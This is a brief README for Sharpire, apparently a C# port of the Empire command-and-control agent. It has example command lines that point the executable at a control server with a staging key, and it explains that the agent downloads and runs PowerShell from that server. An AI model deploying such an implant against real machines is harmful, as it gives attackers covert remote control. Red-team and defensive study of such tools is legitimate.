## Sharpire - An implimentation of the Empire Agent in C#

sharpire.exe \<server\> \<stagingkey\> \<language\>



sharpire.exe "http://192.168.255.100:80" "aRAVQ_z?6PqujiWgf!eNwBZ&G)^h(L/|" "powershell"<br/>
sharpire.exe "http://10.2.2.100:80" "aRAVQ_z?6PqujiWgf!eNwBZ&G)^h(L/|" "dotnet"

*Note: This is still in testing. 

This application has two modes of operation, the first use the executable to stage down the PowerShell and executes it in a runspace. The second has the agent exist entirely in a C# application with PowerShell only being executed in modules.
